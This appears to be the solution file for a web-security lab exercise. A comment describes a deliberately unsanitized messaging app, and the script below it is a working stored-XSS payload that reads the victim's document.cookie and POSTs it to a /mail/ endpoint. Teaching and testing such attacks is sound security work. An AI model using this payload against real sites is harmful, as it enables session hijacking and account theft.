<!--
The exercise contains a simple direct message application, where messages are not properly sanitized. This allows to send messages containing HTML code, and Javascript code. Write a message that–when viewed by the victim in the application–will steal the victim cookie. Write the message in src/msg.html. The test will simulate the heist by sending the message in src/msg.html to the victim and have the victim view the message.

To steal the cookie, use Javascript to send the cookie to mail/ on the same server. Note that in the real world this can be any server but for automatic testing we added the mail/ service to the same server to simulate the heist.

Use POST request to submit the cookie. The request body to mail/ should be a JSON object with a field content containing the victim's cookie as a string.

-->

<script>

var http = new XMLHttpRequest();
http.open("POST", '/mail/');
http.setRequestHeader("Content-type", "application/json");
var cookieData = new Object();
cookieData.content = document.cookie;
http.send(JSON.stringify(cookieData));

</script>